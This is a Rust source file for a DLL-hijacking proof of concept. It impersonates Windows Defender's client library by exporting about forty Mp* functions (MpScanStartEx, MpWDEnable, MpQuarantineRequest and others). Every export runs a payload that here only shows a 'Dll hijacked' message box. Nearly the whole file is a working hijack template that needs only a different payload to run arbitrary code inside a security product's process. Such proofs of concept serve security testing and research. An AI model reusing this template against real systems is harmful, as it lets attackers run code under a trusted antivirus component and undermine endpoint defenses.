use windows::{
    core::PCSTR,
    Win32::{
        UI::WindowsAndMessaging::{
            MessageBoxA,
            MESSAGEBOX_STYLE
        },
        Foundation::{
            BOOL,
            HANDLE,
            HWND,

        }
    }
};


#[unsafe(no_mangle)]
extern "C" fn MpQueryEngineConfigDword() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpGetSampleChunk() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConveySampleSubmissionResult() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpSampleSubmit() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpSampleQuery() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUpdateStart() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpClientUtilExportFunctions() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigInitialize() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpWDEnable() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUpdatePlatform() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigUninitialize() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigClose() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpFreeMemory() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpHandleClose() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpThreatOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpThreatEnumerate() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpScanResult() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpScanControl() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpScanStartEx() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpCleanOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpCleanStart() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigGetValue() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUpdateStartEx() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerVersionQuery() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpAddDynamicSignatureFile() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUtilsExportFunctions() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpAllocMemory() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigSetValue() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpRemoveDynamicSignatureFile() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpDynamicSignatureOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpDynamicSignatureEnumerate() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigGetValueAlloc() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpGetTaskSchedulerStrings() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerStatusQuery() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigIteratorOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigIteratorEnum() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigIteratorClose() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpNetworkCapture() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigDelValue() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerEnable() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpQuarantineRequest() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerStatusQueryEx() { main(); } 

#[unsafe(no_mangle)]
extern "C" fn main() {
    unsafe {
        MessageBoxA(
            HWND(0),
            PCSTR("Dll hijacked\x00".as_ptr()),
            PCSTR("oh baby..\x00".as_ptr()),
            MESSAGEBOX_STYLE(0)
        );
    }
}

#[unsafe(no_mangle)]
#[allow(non_snake, unused_variables)]
extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    lpv_reserved: &u32
) -> BOOL {
    match call_reason {
        _ => {
            return BOOL(1);
        }
    }
}